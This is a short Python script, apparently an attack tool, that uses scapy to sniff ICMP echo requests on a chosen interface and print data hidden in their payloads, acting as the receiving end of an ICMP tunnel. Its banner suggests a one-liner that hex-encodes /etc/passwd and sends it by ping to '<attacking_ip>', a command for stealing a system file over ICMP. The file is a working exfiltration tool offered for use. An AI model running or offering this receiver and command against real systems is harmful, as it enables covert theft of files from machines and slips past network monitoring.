#Tested in Python3

import argparse
from scapy.all import *

#To do: Add exception/errors/logging

def process_packet(pkt):

    ''' 
	Function that processes the packets. 
	Checks for ICMP only.
    '''
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end='')

#End of function (process_packet)

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser("ICMP Tunneling. Usage: icmp-read.py -i eth0\n")
    parser.add_argument('-i', '--interFace', required=True, help="Specify the sniffing interface")
    args = parser.parse_args()
    interFace = args.interFace

    print ("[+] MVV-AROD. ENERO 2019\n")
    print ("[+] Try something like: xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line <attacking_ip>; done")
    print ("[+] Waiting on ICMP Traffic....\n")

    sniff(iface=interFace, prn=process_packet)

